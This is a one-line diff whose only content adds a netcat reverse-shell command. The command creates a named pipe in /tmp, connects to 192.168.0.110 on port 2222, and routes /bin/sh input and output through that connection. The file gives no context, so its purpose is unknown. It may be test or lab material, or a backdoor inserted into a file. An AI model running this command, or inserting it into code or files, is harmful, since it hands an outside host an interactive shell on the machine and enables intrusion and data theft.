@@ -1,0 +1,1 @@
+mkfifo /tmp/f; nc 192.168.0.110 2222 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
